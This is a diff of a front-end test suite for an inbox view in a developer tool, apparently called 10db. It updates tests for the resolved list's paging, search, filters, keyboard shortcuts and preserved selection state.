-      let closed = false;
-      serve(
-        http.get(daemonUrl('/inbox'), () => HttpResponse.json(closed ? [] : [stray])),
+      const { served } = inbox([stray]);
+      server.use(
         http.post(daemonUrl('/inbox/:id/answer'), () => {
-          closed = true;
+          served.open = [];
           return HttpResponse.json(
             { error: 'conflict', message: `Inbox item ${stray.id} is already RESOLVED` },
             { status: 409 },
@@ -983,9 +1099,10 @@ describe('InboxView', () => {
         }),
       );
       renderApp('/inbox');
-      await screen.findByText('Write outside every claim');
-      fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }));
-      expect(await screen.findByText('Nothing needs you right now.')).toBeTruthy();
+      await findText('Write outside every claim');
+      await findRow('Write outside every claim');
+      fireEvent.click(dismissOf('Write outside every claim'));
+      expect(await findText('Nothing needs you')).toBeTruthy();
     });
   });
 });
@@ -1015,8 +1132,9 @@ describe("a UI Workbench pass's Ready pages", () => {
   it('show as one row naming each page, with no Approve or Send Back; Enter opens the UI Workbench', async () => {
     const { answers } = inbox([ready('Ready: Settings'), ready('Ready: People')]);
     const { router } = renderApp('/inbox');
-    expect(await screen.findByText('UI Workbench: 2 pages ready')).toBeTruthy();
-    expect(screen.getByRole('tab', { name: /^Open\s?1$/ })).toBeTruthy();
+    expect(await findText('UI Workbench: 2 pages ready')).toBeTruthy();
+    expect(rowOf('UI Workbench: 2 pages ready').textContent).toContain('CHECK');
+    expect(screen.getByRole('radio', { name: /^Open\s?1$/ })).toBeTruthy();
     const card = selectedCard();
     expect(within(card).getByText('Ready: Settings')).toBeTruthy();
     expect(within(card).getByText('Ready: People')).toBeTruthy();
@@ -1047,7 +1165,7 @@ describe("a UI Workbench pass's shared-area question", () => {
     });
     const { answers } = inbox([asked]);
     renderApp('/inbox');
-    expect(await screen.findByText('People wants to change shared code in src')).toBeTruthy();
+    expect(await findText('People wants to change shared code in src')).toBeTruthy();
     for (const label of [SHARED_ASK_ALLOW_CHOICE, SHARED_ASK_KEEP_CHOICE, SHARED_ASK_REPLY_CHOICE])
       expect(screen.getByRole('radio', { name: new RegExp(label) })).toBeTruthy();
 
@@ -1123,7 +1241,7 @@ describe("a UI Workbench pass's cards", () => {
   ])('$name', async ({ card, command, pullRequest }) => {
     inbox([card]);
     renderApp('/inbox');
-    fireEvent.click(await screen.findByText(card.title));
+    fireEvent.click(await findText(card.title));
     const shown = selectedCard();
     await within(shown).findByText('What the pass did.');
     const copy = within(shown).queryByRole('button', { name: 'Copy command' });
@@ -1153,179 +1271,162 @@ describe('the resolved view', () => {
     state: 'RESOLVED',
     title: 'Which badge color?',
     answer: { choice: 'Teal' },
+    options: [{ label: 'Teal', description: 'Matches the theme' }],
     updatedAt: '2026-10-30T11:00:00.000Z',
   });
 
+  afterEach(() => {
+    lastInboxSearch.set({});
+    for (const state of ['open', 'waiting', 'resolved'] as const) {
+      rememberSelected(state, null);
+      rememberScroll(state, 0);
+    }
+  });
+
   /**
-   * Serves the open list and the resolved page; returns every query the resolved page was asked with.
-   * Every GET /inbox answers the open cards, so a view that asked it for resolved ones would show them.
+   * Serves the open list and the resolved rows; returns every query asked. Every GET /inbox answers the open
+   * cards, so a view that asked it for resolved ones would show them.
    */
-  function serveBoth(
-    open: InboxItemDto[],
-    resolved: InboxItemDto[],
-    total?: number,
-  ): Record<string, string>[] {
-    serve(http.get(daemonUrl('/inbox'), () => HttpResponse.json(open)));
-    return serveInboxPage({ resolved }, total === undefined ? {} : { resolved: total });
+  function serveBoth(open: InboxItemDto[], resolved: InboxItemDto[]): Record<string, string>[] {
+    serve(
+      http.get(daemonUrl('/inbox'), () => HttpResponse.json(open)),
+      http.get(daemonUrl('/inbox/:id/context'), () => HttpResponse.json({ messages: [] })),
+    );
+    return serveInboxRows({ open, resolved });
   }
 
-  const RESOLVED = 'Resolved cards';
+  /** The Resolved list's pages, not the counts. */
+  const pages = (asked: Record<string, string>[]): Record<string, string>[] =>
+    asked.filter((q) => q['state'] === 'resolved' && q['pageSize'] === '50');
   const lastAsked = (asked: Record<string, string>[]): Record<string, string> | undefined =>
-    asked.at(-1);
+    pages(asked).at(-1);
 
-  it('draws the same header on Open and Resolved: title, Open n / Resolved switch, a ? button', async () => {
+  it("draws the same header on Open and Resolved: title, the panel's state switch, a ? button", async () => {
     serveBoth([color], [answered]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
+    await findText('Which badge color?');
 
     const title = screen.getByRole('heading', { name: 'Inbox' });
     expect(title.closest('[data-title-row]')).not.toBeNull();
-    const switcher = screen.getByRole('tablist', { name: 'Inbox view' });
-    const openTab = screen.getByRole('tab', { name: /^Open\s?1$/ });
-    expect(openTab.getAttribute('aria-selected')).toBe('true');
+    const switcher = screen.getByRole('radiogroup', { name: 'Inbox state' });
+    expect(screen.getByRole<HTMLInputElement>('radio', { name: /^Open\s?1$/ }).checked).toBe(true);
     const help = screen.getByRole('button', { name: 'Keyboard shortcuts' });
     expect(help.getAttribute('data-size')).toBe('xs');
     expect(help.getAttribute('data-variant')).toBe('subtle');
 
-    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));
-    await tableRows(RESOLVED);
+    fireEvent.click(screen.getByRole('radio', { name: 'Resolved' }));
+    await findPanelRow('Which badge color?');
 
     // The same elements stay mounted, so nothing in the header moves or resizes.
     expect(screen.getByRole('heading', { name: 'Inbox' })).toBe(title);
-    expect(screen.getByRole('tablist', { name: 'Inbox view' })).toBe(switcher);
+    expect(screen.getByRole('radiogroup', { name: 'Inbox state' })).toBe(switcher);
     expect(screen.getByRole('button', { name: 'Keyboard shortcuts' })).toBe(help);
-    expect(screen.getByRole('tab', { name: 'Resolved' }).getAttribute('aria-selected')).toBe(
-      'true',
-    );
-    expect(screen.getByRole('tab', { name: /^Open\s?1$/ })).toBeTruthy();
+    expect(screen.getByRole<HTMLInputElement>('radio', { name: 'Resolved' }).checked).toBe(true);
+    expect(screen.getByRole('radio', { name: /^Open\s?1$/ })).toBeTruthy();
   });
 
   it('keeps the ? key on Open only', async () => {
     serveBoth([color], [answered]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
-    fireEvent.click(screen.getByRole('tab', { name: 'Resolved' }));
-    await tableRows(RESOLVED);
+    await findText('Which badge color?');
+    fireEvent.click(screen.getByRole('radio', { name: 'Resolved' }));
+    await findPanelRow('Which badge color?');
     key('?', { shiftKey: true });
     expect(screen.queryByRole('dialog', { name: 'Keyboard Shortcuts' })).toBeNull();
   });
 
-  it('asks the daemon for one page, newest first, and draws the rows in its order', async () => {
-    const asked = serveBoth([color], [answered, closedBy10db]);
+  it('asks the daemon for one page of 50 with no page number, and draws the rows newest first', async () => {
+    const asked = serveBoth([color], [closedBy10db, answered]);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
-    fireEvent.click(screen.getByRole('tab', { name: /^Resolved/ }));
+    await findText('Which badge color?');
+    fireEvent.click(screen.getByRole('radio', { name: /^Resolved/ }));
 
-    const rows = await tableRows(RESOLVED, 2);
-    // One page, never a fixed count of the latest cards.
-    expect(asked[0]).toEqual({
-      state: 'resolved',
-      sort: 'updatedAt',
-      dir: 'desc',
-      page: '1',
-      pageSize: '25',
-    });
-    expect(rows.map((row) => row.textContent)).toEqual([
-      expect.stringContaining('Which badge color?'),
-      expect.stringContaining('Batch not started: 10db will not run git in /repo'),
-    ]);
-    expect(rows[0]?.textContent).toContain('Answered');
-    expect(rows[1]?.textContent).toContain('Closed by 10db');
+    const texts = await panelRowTexts(2);
+    expect(pages(asked)[0]).toEqual({ state: 'resolved', pageSize: '50' });
+    expect(texts[0]).toContain('Which badge color?');
+    expect(texts[0]).toContain('Answered · Teal');
+    expect(texts[1]).toContain('Batch not started: 10db will not run git in /repo');
+    expect(texts[1]).toContain('Closed by 10db · Dismissed');
     // The open cards and their keys are not there.
     expect(screen.queryByRole('button', { name: 'Send Answer' })).toBeNull();
   });
 
-  it('opens a row with Enter or → for who closed it and why, and closes it with ←', async () => {
+  it('shows how a card closed on a click, and the row above it on k', async () => {
     serveBoth([], [answered, closedBy10db]);
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    const [first, second] = await tableRows(RESOLVED, 2);
-    if (first === undefined || second === undefined) throw new Error('two rows');
-    expect(screen.queryByText('Answered: Teal')).toBeNull();
-    first.focus();
-    fireEvent.keyDown(first, { key: 'Enter' });
-    expect(await screen.findByText('Answered: Teal')).toBeTruthy();
-    expect(first.getAttribute('aria-expanded')).toBe('true');
-    // ↓ moves to the next row, and → opens it.
-    fireEvent.keyDown(first, { key: 'ArrowDown' });
-    expect(document.activeElement).toBe(second);
-    fireEvent.keyDown(second, { key: 'ArrowRight' });
-    expect(await screen.findByText('Resolved by 10db: Alpha started')).toBeTruthy();
-    fireEvent.keyDown(second, { key: 'ArrowUp' });
-    expect(document.activeElement).toBe(first);
-    fireEvent.keyDown(first, { key: 'ArrowLeft' });
-    await waitFor(() => {
-      expect(first.getAttribute('aria-expanded')).toBe('false');
-    });
-    expect(second.getAttribute('aria-expanded')).toBe('true');
+    renderApp('/inbox?state=resolved');
+    expect(await findText('Answered: Teal')).toBeTruthy();
+    fireEvent.click(await findPanelRow('Batch not started'));
+    expect(await findText('Resolved by 10db: Alpha started')).toBeTruthy();
+    expect(queryText('Answered: Teal')).toBeNull();
+    key('k');
+    expect(await findText('Answered: Teal')).toBeTruthy();
   });
 
   it.each([
     ['Kind', 'Flag', { kind: 'flag' }],
     ['Outcome', 'Slack Answer', { outcome: 'slack' }],
     ['Outcome', 'Closed by 10db', { outcome: '10db' }],
-  ])('sends the %s filter %s to the daemon', async (column, choice, filter) => {
+  ])('sends the %s filter %s to the daemon', async (group, choice, filter) => {
     const asked = serveBoth([], [answered]);
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await tableRows(RESOLVED);
-    fireEvent.click(screen.getByRole('button', { name: `Filter ${column}` }));
-    await pickOption(await screen.findByRole('combobox', { name: column }), choice);
+    renderApp('/inbox?state=resolved');
+    await findPanelRow('Which badge color?');
+    await chooseFilter(group, choice);
     await waitFor(() => {
-      expect(lastAsked(asked)).toEqual({
-        state: 'resolved',
-        sort: 'updatedAt',
-        dir: 'desc',
-        page: '1',
-        pageSize: '25',
-        ...filter,
-      });
+      expect(lastAsked(asked)).toEqual({ state: 'resolved', pageSize: '50', ...filter });
     });
   });
 
-  it('sorts by a column on the daemon', async () => {
+  it.each([
+    ['Today', 'day', 0],
+    ['Last 7 Days', 'week', 6],
+    ['Last 30 Days', 'month', 29],
+  ] as const)('sends When: %s as `since`, from local midnight', async (choice, since, back) => {
     const asked = serveBoth([], [answered]);
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await tableRows(RESOLVED);
-    fireEvent.click(screen.getByRole('button', { name: 'Sort by Title' }));
+    const { router } = renderApp('/inbox?state=resolved');
+    await findPanelRow('Which badge color?');
+    await chooseFilter('When', choice);
     await waitFor(() => {
-      expect(lastAsked(asked)).toMatchObject({ sort: 'title', dir: 'desc' });
+      expect(router.state.location.search).toMatchObject({ since });
+    });
+    await waitFor(() => {
+      const from = new Date();
+      from.setHours(0, 0, 0, 0);
+      from.setDate(from.getDate() - back);
+      expect(lastAsked(asked)?.['since']).toBe(from.toISOString());
     });
   });
 
-  it('asks for the next page from the pager', async () => {
-    const asked = serveBoth([], [answered], 60);
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await tableRows(RESOLVED);
-    expect(await screen.findByText('1–25 of 60')).toBeTruthy();
-    fireEvent.click(screen.getByRole('button', { name: 'Page 2' }));
+  it('puts the Project filter in the URL and the query, and marks the chosen project', async () => {
+    const alpha = projectViewDto({ name: 'alpha' });
+    const beta = projectViewDto({ name: 'beta' });
+    const asked = serveBoth([], [answered]);
+    server.use(http.get(daemonUrl('/projects'), () => HttpResponse.json([alpha, beta])));
+    const { router } = renderApp('/inbox?state=resolved');
+    await findPanelRow('Which badge color?');
+    await chooseFilter('Project', 'beta');
     await waitFor(() => {
-      expect(lastAsked(asked)).toMatchObject({ page: '2', pageSize: '25' });
+      expect(router.state.location.search).toMatchObject({ project: beta.id });
     });
+    await waitFor(() => {
+      expect(lastAsked(asked)).toEqual({ state: 'resolved', pageSize: '50', project: beta.id });
+    });
+    fireEvent.click(screen.getByRole('button', { name: 'Filter' }));
+    expect(
+      await screen.findByRole('menuitem', { name: 'beta', current: true, hidden: true }),
+    ).toBeTruthy();
   });
 
-  it('sends the Project filter in the URL to the daemon', async () => {
+  it('sends the Project filter in the URL to the daemon, and only that one', async () => {
     const only = mintId('Project');
-    const asked = serveBoth([], [answered]);
-    renderApp(`/inbox?project=${only}`);
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await tableRows(RESOLVED);
-    expect(asked.length).toBeGreaterThan(0);
-    // Every ask names the project: no page of every project's cards reaches the view.
-    for (const query of asked)
-      expect(query).toEqual({
-        state: 'resolved',
-        project: only,
-        sort: 'updatedAt',
-        dir: 'desc',
-        page: '1',
-        pageSize: '25',
-      });
+    const asked = serveBoth([], [inboxItemDto({ ...answered, projectId: only })]);
+    renderApp(`/inbox?state=resolved&project=${only}`);
+    await findPanelRow('Which badge color?');
+    expect(pages(asked).length).toBeGreaterThan(0);
+    for (const query of pages(asked))
+      expect(query).toEqual({ state: 'resolved', pageSize: '50', project: only });
   });
 
-  it('says why a send failed when its row opens', async () => {
+  it('says why a send failed when its row is shown', async () => {
     const failed = inboxItemDto({
       ...answered,
       send: sendDto({
@@ -1336,13 +1437,9 @@ describe('the resolved view', () => {
       }),
     });
     serveBoth([], [failed]);
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await openEveryRow(RESOLVED);
+    renderApp('/inbox?state=resolved');
     expect(
-      await screen.findByText(
-        'Slack refused: channel_not_found. Mark Ellis may have left the workspace.',
-      ),
+      await findText('Slack refused: channel_not_found. Mark Ellis may have left the workspace.'),
     ).toBeTruthy();
   });
 
@@ -1351,7 +1448,7 @@ describe('the resolved view', () => {
       inboxItemDto({
         kind: 'proposal',
         state: 'RESOLVED',
-        title: 'Tests never sleep',
+        title: `Tests never sleep (${choice})`,
         options: [
           { label: 'accept_project', description: 'Confirm it for this project' },
           { label: 'accept_you', description: 'Confirm it for you, in every project' },
@@ -1386,28 +1483,273 @@ describe('the resolved view', () => {
         gone,
       ],
     );
-    renderApp('/inbox');
-    fireEvent.click(await screen.findByRole('tab', { name: /^Resolved/ }));
-    await openEveryRow(RESOLVED, 6);
+    renderApp('/inbox?state=resolved');
+    const texts = await panelRowTexts(6);
+    // The rows' second lines and the content use the same words.
     for (const words of [
-      'Answered: This Project',
-      'Answered: All Projects',
-      'Answered: This Area',
-      'Answered: Reject',
-      'Answered: Allow once',
-      'Answered: Violet',
+      'Answered · This Project',
+      'Answered · All Projects',
+      'Answered · This Area',
+      'Answered · Reject',
+      'Answered · Allow once',
+      'Answered · Violet',
     ]) {
-      expect(screen.getByText(words)).toBeTruthy();
+      expect(texts.some((text) => text.includes(words))).toBe(true);
     }
-    expect(screen.queryByText(/accept_|allow_once/)).toBeNull();
+    for (const row of panelRows()) {
+      fireEvent.click(row);
+      expect(await findText(/^Answered: /)).toBeTruthy();
+    }
+    expect(queryText(/accept_|allow_once/)).toBeNull();
   });
 
-  it('says so when nothing has been resolved', async () => {
+  it('says nothing resolved yet', async () => {
     serveBoth([color], []);
     renderApp('/inbox');
-    await screen.findByText('Which badge color?');
-    fireEvent.click(screen.getByRole('tab', { name: /^Resolved/ }));
-    expect(await screen.findByText('Nothing has been resolved yet.')).toBeTruthy();
+    await findText('Which badge color?');
+    fireEvent.click(screen.getByRole('radio', { name: /^Resolved/ }));
+    expect(await findText('Nothing resolved yet')).toBeTruthy();
+  });
+
+  describe('search and filters', () => {
+    const many = (n: number): InboxItemDto[] =>
+      Array.from({ length: n }, (_, i) =>
+        inboxItemDto({
+          kind: 'question',
+          state: 'RESOLVED',
+          title: `Retry number ${String(i)}?`,
+          answer: { choice: 'Teal' },
+          options: [{ label: 'Teal', description: '' }],
+          updatedAt: new Date(Date.UTC(2026, 9, 30, 10, 0, 59 - i)).toISOString(),
+        }),
+      );
+    const search = (): HTMLInputElement => {
+      const field = screen.getByRole('textbox', { name: 'Search the Inbox' });
+      if (!(field instanceof HTMLInputElement)) throw new Error('not an input');
+      return field;
+    };
+
+    it('sends one query for what is typed, after the debounce, not one per keystroke', async () => {
+      const asked = serveBoth([], many(3));
+      const { router } = renderApp('/inbox?state=resolved');
+      await panelRowTexts(3);
+      const before = pages(asked).length;
+      for (const text of ['r', 're', 'ret', 'retr', 'retry'])
+        fireEvent.change(search(), { target: { value: text } });
+      await waitFor(() => {
+        expect(router.state.location.search).toMatchObject({ q: 'retry' });
+      });
+      await waitFor(() => {
+        expect(pages(asked).length).toBeGreaterThan(before);
+      });
+      expect(
+        pages(asked)
+          .slice(before)
+          .map((q) => q['q']),
+      ).toEqual(['retry']);
+    });
+
+    it('selects the first row of the new list, not the row at the old index', async () => {
+      serveBoth([], many(12));
+      renderApp('/inbox?state=resolved');
+      fireEvent.click(await findPanelRow('Retry number 5?'));
+      expect(panelRows()[5]?.getAttribute('aria-selected')).toBe('true');
+      fireEvent.change(search(), { target: { value: 'number 1' } });
+      await waitFor(() => {
+        expect(panelRows().map((row) => row.textContent.slice(0, 15))).toHaveLength(3);
+      });
+      expect(panelRows()[0]?.getAttribute('aria-selected')).toBe('true');
+    });
+
+    it('reads page two on j past the loaded end of Resolved, then selects the next row', async () => {
+      let release: () => void = () => undefined;
+      const gate = new Promise<void>((resolve) => {
+        release = resolve;
+      });
+      serveBoth([], many(52));
+      serveInboxRows({ resolved: many(52) }, (query) =>
+        query['after'] !== undefined ? gate : undefined,
+      );
+      renderApp('/inbox?state=resolved');
+      await findPanelRow('Retry number 0?');
+      for (let i = 0; i < 49; i += 1) key('j');
+      expect(await findText('Retry number 49?')).toBeTruthy();
+      key('j');
+      release();
+      expect(await findText('Retry number 50?')).toBeTruthy();
+    });
+
+    it('keeps the old rows on screen while the new page is in flight', async () => {
+      let release: () => void = () => undefined;
+      const held = new Promise<void>((resolve) => {
+        release = resolve;
+      });
+      let reached: () => void = () => undefined;
+      const arrived = new Promise<void>((resolve) => {
+        reached = resolve;
+      });
+      serveBoth([], many(3));
+      serveInboxRows({ resolved: many(3) }, (query) => {
+        if (query['q'] !== 'number 1') return undefined;
+        reached();
+        return held;
+      });
+      renderApp('/inbox?state=resolved');
+      await panelRowTexts(3);
+      fireEvent.change(search(), { target: { value: 'number 1' } });
+      // The new list's query has gone out and is held: the old rows are still there.
+      await arrived;
+      expect(panelRows()).toHaveLength(3);
+      expect(screen.queryByText('No matches')).toBeNull();
+      release();
+      const texts = await panelRowTexts(1);
+      expect(texts[0]).toContain('Retry number 1?');
+    });
+
+    it('says No matches with a Clear Filters button that empties q and the filters', async () => {
+      serveBoth([], many(2));
+      const { router } = renderApp('/inbox?state=resolved&kind=flag&q=zzz');
+      expect(await screen.findByText('No matches')).toBeTruthy();
+      fireEvent.click(screen.getByRole('button', { name: 'Clear Filters' }));
+      await waitFor(() => {
+        expect(router.state.location.search).toEqual({ state: 'resolved' });
+      });
+      await panelRowTexts(2);
+      expect(search().value).toBe('');
+    });
+
+    it('focuses the search with ⌘F', async () => {
+      serveBoth([], many(1));
+      renderApp('/inbox?state=resolved');
+      await panelRowTexts(1);
+      fireEvent.keyDown(document.body, { key: 'f', metaKey: true });
+      await waitFor(() => {
+        expect(document.activeElement).toBe(search());
+      });
+    });
+
+    it('unfolds a folded panel and focuses the search with ⌘F', async () => {
+      serveBoth([], many(1));
+      renderApp('/inbox?state=resolved');
+      await panelRowTexts(1);
+      fireEvent.keyDown(document, { key: '\\', metaKey: true });
+      await waitFor(() => {
+        expect(document.querySelector('[data-panel]')?.getAttribute('data-panel')).toBe('hidden');
+      });
+      fireEvent.keyDown(document.body, { key: 'f', metaKey: true });
+      await waitFor(() => {
+        expect(document.querySelector('[data-panel]')?.getAttribute('data-panel')).toBe('column');
+        expect(document.activeElement).toBe(search());
+      });
+    });
+
+    it('opens a URL with a search and a filter showing both', async () => {
+      const asked = serveBoth([], many(1));
+      renderApp('/inbox?state=resolved&q=x&kind=flag');
+      await waitFor(() => {
+        expect(search().value).toBe('x');
+      });
+      await waitFor(() => {
+        expect(lastAsked(asked)).toEqual({
+          state: 'resolved',
+          pageSize: '50',
+          q: 'x',
+          kind: 'flag',
+        });
+      });
+      fireEvent.click(screen.getByRole('button', { name: 'Filter' }));
+      expect(
+        await screen.findByRole('menuitem', { name: 'Flag', current: true, hidden: true }),
+      ).toBeTruthy();
+    });
+
+    it('hides 10db’s own cards while a search is set', async () => {
+      serveBoth([], []);
+      server.use(
+        http.get(daemonUrl('/slack'), () =>
+          HttpResponse.json(slackConnection({ state: 'refused' })),
+        ),
+      );
+      renderApp('/inbox?q=zzz');
+      expect(await screen.findByText('No matches')).toBeTruthy();
+      expect(panelRows()).toHaveLength(0);
+    });
+
+    it('keeps the state, search, selected row and scroll through the rail', async () => {
+      serveBoth([], many(40));
+      const { router } = renderApp('/inbox?state=resolved&q=Retry');
+      fireEvent.click(await findPanelRow('Retry number 2?'));
+      expect((await findPanelRow('Retry number 2?')).getAttribute('aria-selected')).toBe('true');
+      const list = (): HTMLElement => {
+        const el = document.querySelector('[data-inbox-list] .mantine-ScrollArea-viewport');
+        if (!(el instanceof HTMLElement)) throw new Error('no list viewport');
+        return el;
+      };
+      list().scrollTop = 120;
+      fireEvent.scroll(list());
+      const rail = (name: string): HTMLElement => {
+        const link = [...document.querySelectorAll<HTMLElement>('a[data-rail-item]')].find((a) =>
+          a.textContent.startsWith(name),
+        );
+        if (link === undefined) throw new Error(`no rail link ${name}`);
+        return link;
+      };
+      fireEvent.click(rail('Board'));
+      await waitFor(() => {
+        expect(router.state.location.pathname).toBe('/board');
+      });
+      fireEvent.click(rail('Inbox'));
+      await waitFor(() => {
+        expect(router.state.location.pathname).toBe('/inbox');
+      });
+      expect(router.state.location.search).toEqual({ state: 'resolved', q: 'Retry' });
+      expect((await findPanelRow('Retry number 2?')).getAttribute('aria-selected')).toBe('true');
+      expect(search().value).toBe('Retry');
+      expect(list().scrollTop).toBe(120);
+    });
+
+    it('keeps the selected row when the list left the cache while the builder was away', async () => {
+      serveBoth([], many(40));
+      const { router, queryClient } = renderApp('/inbox?state=resolved');
+      fireEvent.click(await findPanelRow('Retry number 2?'));
+      const rail = (name: string): HTMLElement => {
+        const link = [...document.querySelectorAll<HTMLElement>('a[data-rail-item]')].find((a) =>
+          a.textContent.startsWith(name),
+        );
+        if (link === undefined) throw new Error(`no rail link ${name}`);
+        return link;
+      };
+      fireEvent.click(rail('Board'));
+      await waitFor(() => {
+        expect(router.state.location.pathname).toBe('/board');
+      });
+      queryClient.removeQueries({ queryKey: ['inbox-rows'] });
+      fireEvent.click(rail('Inbox'));
+      expect((await findPanelRow('Retry number 2?')).getAttribute('aria-selected')).toBe('true');
+    });
+
+    it('keeps the selected Open row when the list left the cache while the builder was away', async () => {
+      serveBoth([color, corners], []);
+      const { router, queryClient } = renderApp('/inbox');
+      fireEvent.click(await findRow('Round or square corners?'));
+      const board = [...document.querySelectorAll<HTMLElement>('a[data-rail-item]')].find((a) =>
+        a.textContent.startsWith('Board'),
+      );
+      if (board === undefined) throw new Error('no rail link Board');
+      fireEvent.click(board);
+      await waitFor(() => {
+        expect(router.state.location.pathname).toBe('/board');
+      });
+      queryClient.removeQueries({ queryKey: ['inbox-rows'] });
+      const inbox = [...document.querySelectorAll<HTMLElement>('a[data-rail-item]')].find((a) =>
+        a.textContent.startsWith('Inbox'),
+      );
+      if (inbox === undefined) throw new Error('no rail link Inbox');
+      fireEvent.click(inbox);
+      expect((await findRow('Round or square corners?')).getAttribute('aria-selected')).toBe(
+        'true',
+      );
+    });
   });
 });
 
@@ -1452,7 +1794,7 @@ describe('knowledge on cards', () => {
     inbox([principleCard]);
     serveProject();
     renderApp('/inbox');
-    await screen.findByText('No sleeps in tests');
+    await findText('No sleeps in tests');
     const card = selectedCard();
     expect(within(card).getByText(/Never sleep in tests/)).toBeTruthy();
     expect(await within(card).findByText('Rule')).toBeTruthy();
@@ -1628,7 +1970,7 @@ describe('knowledge on cards', () => {
     renderApp('/inbox');
     fireEvent.click(await screen.findByRole('checkbox', { name: 'Record as a decision' }));
     key('j');
-    await screen.findByText('Which cache?');
+    await findText('Which cache?');
     expect(
       screen.getByRole<HTMLInputElement>('checkbox', { name: 'Record as a decision' }).checked,
     ).toBe(true);
@@ -1646,7 +1988,7 @@ describe('knowledge on cards', () => {
       }),
     ]);
     renderApp('/inbox');
-    expect(await screen.findByText('Run curl?')).toBeTruthy();
+    expect(await findText('Run curl?')).toBeTruthy();
     expect(screen.queryByRole('checkbox', { name: 'Record as a decision' })).toBeNull();
   });
 });
@@ -1672,14 +2014,14 @@ describe('a resolved answer that proposed a principle', () => {
 
   function serveResolved(resolved: InboxItemDto[]): void {
     serve(http.get(daemonUrl('/inbox'), () => HttpResponse.json([])));
-    serveInboxPage({ resolved });
+    serveInboxRows({ resolved });
   }
 
-  const RESOLVED = 'Resolved cards';
-  /** Opens the Resolved tab and every row in it; returns the rows' details, in order. */
+  /** Opens Resolved and picks each row in turn; returns the details of the last row shown. */
   async function openResolved(count = 1): Promise<HTMLElement[]> {
-    fireEvent.click(await screen.findByRole('tab', { name: 'Resolved' }));
-    await openEveryRow(RESOLVED, count);
+    fireEvent.click(await screen.findByRole('radio', { name: 'Resolved' }));
+    await panelRowTexts(count);
+    for (const row of panelRows()) fireEvent.click(row);
     return screen.findAllByTestId('resolved-detail');
   }
 
@@ -1711,10 +2053,14 @@ describe('a resolved answer that proposed a principle', () => {
 
   it('says a principle was proposed, on the card that proposed it only', async () => {
     serveResolved([answered, plain]);
-    renderApp('/inbox');
-    const details = await openResolved(2);
-    expect(details[0]?.textContent).toContain('A principle was proposed');
-    expect(details[1]?.textContent).not.toContain('principle');
+    renderApp('/inbox?state=resolved');
+    fireEvent.click(await findPanelRow('Which queue?'));
+    expect((await screen.findByTestId('resolved-detail')).textContent).toContain(
+      'A principle was proposed',
+    );
+    fireEvent.click(await findPanelRow('Which badge color?'));
+    expect(await findText('Answered: Teal')).toBeTruthy();
+    expect(screen.getByTestId('resolved-detail').textContent).not.toContain('principle');
   });
 
   it('opens a principle still waiting for a verdict, under Pending', async () => {
@@ -1726,7 +2072,7 @@ describe('a resolved answer that proposed a principle', () => {
     const drawer = await openDrawer();
     expect(await within(drawer).findByText('Never add Redis for queues.')).toBeTruthy();
     await waitFor(() => {
-      expect(screen.getByText(/^Showing proposed principles/)).toBeTruthy();
+      expect(getText(/^Showing proposed principles/)).toBeTruthy();
     });
   });
 
@@ -1791,13 +2137,13 @@ describe('a resolved answer that proposed a principle', () => {
     fireEvent.click(await screen.findByRole('link', { name: 'Open in Knowledge' }));
     const drawer = await openDrawer();
     await waitFor(() => {
-      expect(screen.getByText(/^Showing proposed principles/)).toBeTruthy();
+      expect(getText(/^Showing proposed principles/)).toBeTruthy();
     });
     fireEvent.click(within(drawer).getByRole('button', { name: 'Close' }));
     await waitFor(() => {
       expect(router.state.location.search).toEqual({});
     });
-    expect(screen.getByText(/^Showing proposed principles/)).toBeTruthy();
+    expect(getText(/^Showing proposed principles/)).toBeTruthy();
   });
 
   it('gives each principle its own link when an answer proposed several', async () => {
@@ -1846,26 +2192,564 @@ describe('Inbox across projects', () => {
   it('shows every project’s cards, each naming its project', async () => {
     twoProjects();
     renderApp('/inbox');
-    // A card's header row holds its kind, its project and its title. The cards can arrive before the
-    // projects that name them, so each header is waited on until it names its project.
-    const header = (title: string) => screen.getByText(title).parentElement?.textContent;
+    // A row's second line holds its project. The cards can arrive before the projects that name them,
+    // so each row is waited on until it names its project.
     await waitFor(() => {
-      expect(header('Alpha question?')).toContain('alpha');
+      expect(rowOf('Alpha question?').textContent).toContain('alpha');
     });
     await waitFor(() => {
-      expect(header('Beta question?')).toContain('beta');
+      expect(rowOf('Beta question?').textContent).toContain('beta');
     });
-    expect(screen.getByRole('tab', { name: /^Open\s?2$/ })).toBeTruthy();
+    expect(screen.getByRole('radio', { name: /^Open\s?2$/ })).toBeTruthy();
   });
 
-  it('narrows the cards and the Open count by its own project filter', async () => {
+  it('narrows the rows by its own project filter', async () => {
     twoProjects();
     renderApp(`/inbox?project=${beta.id}`);
-    expect(await screen.findByText('Beta question?')).toBeTruthy();
-    expect(screen.queryByText('Alpha question?')).toBeNull();
-    expect(screen.getByRole('tab', { name: /^Open\s?1$/ })).toBeTruthy();
-    expect(screen.getByRole('combobox', { name: 'Project' })).toBe(
-      screen.getByDisplayValue('beta'),
+    expect(await findRow('Beta question?')).toBeTruthy();
+    expect(rows()).toHaveLength(1);
+    fireEvent.click(screen.getByRole('button', { name: 'Filter' }));
+    expect(
+      await screen.findByRole('menuitem', { name: 'beta', current: true, hidden: true }),
+    ).toBeTruthy();
+  });
+});
+
+describe('the Inbox panel', () => {
+  const question = (title: string, at = 0): InboxItemDto =>
+    inboxItemDto({
+      kind: 'question',
+      title,
+      body: '',
+      options: [
+        { label: 'A', description: '' },
+        { label: 'B', description: '' },
+      ],
+      createdAt: new Date(Date.UTC(2026, 9, 13, 12, 0, at)).toISOString(),
+    });
+  const numbered = (count: number): InboxItemDto[] =>
+    Array.from({ length: count }, (_, i) => question(`Card ${String(i)}`, i));
+
+  afterEach(resetViewportWidth);
+
+  it('selects the row after an answered one', async () => {
+    const [a, b, c] = [
+      question('First?', 0),
+      question('Second?', 1),
+      question('Third?', 2),
+    ] as const;
